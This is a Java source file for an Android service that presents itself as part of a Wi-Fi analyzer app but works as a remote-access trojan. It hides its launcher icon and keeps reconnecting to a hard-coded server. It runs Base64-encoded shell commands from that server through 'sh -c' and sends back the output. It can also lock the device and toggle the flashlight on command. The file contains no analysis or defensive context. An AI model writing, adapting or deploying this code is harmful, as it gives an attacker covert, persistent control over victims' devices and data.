package com.network.wifianalyzer;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraManager;
import android.os.IBinder;
import android.util.Base64;
import java.io.*;
import java.net.Socket;

public class Agent extends Service {
    String SERVER = "192.168.1.41"; 
    int PORT = 9999;

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        PackageManager p = getPackageManager();
        ComponentName cn = new ComponentName(this, Main.class);
        p.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        new Thread(new Runnable() { public void run() { loop(); } }).start();
        return START_STICKY;
    }

    void loop() {
        while (true) {
            try {
                Socket sock = new Socket(SERVER, PORT);
                BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                PrintWriter out = new PrintWriter(sock.getOutputStream(), true);
                out.println("Device Connected: " + android.os.Build.MODEL);
                
                String cmd;
                while ((cmd = in.readLine()) != null) {
                    String decoded = new String(Base64.decode(cmd, Base64.DEFAULT));
                    out.println("$ " + decoded);
                    
                    if (decoded.equals("TORCH_ON")) toggleFlash(true, out);
                    else if (decoded.equals("TORCH_OFF")) toggleFlash(false, out);
                    else if (decoded.equals("LOCK")) lockDevice(out);
                    else out.println(run(decoded));
                }
                sock.close();
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception x) {}
            }
        }
    }

    void toggleFlash(boolean on, PrintWriter out) {
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            cm.setTorchMode(cm.getCameraIdList()[0], on);
            out.println(on ? "Flash ON" : "Flash OFF");
        } catch (Exception e) { out.println("Flash Error: " + e.getMessage()); }
    }

    void lockDevice(PrintWriter out) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            dpm.lockNow();
            out.println("Device Locked");
        } catch (Exception e) { out.println("Lock Error: Admin not active"); }
    }

    String run(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = r.readLine()) != null) sb.append(l).append("\n");
            p.waitFor();
            return sb.toString();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
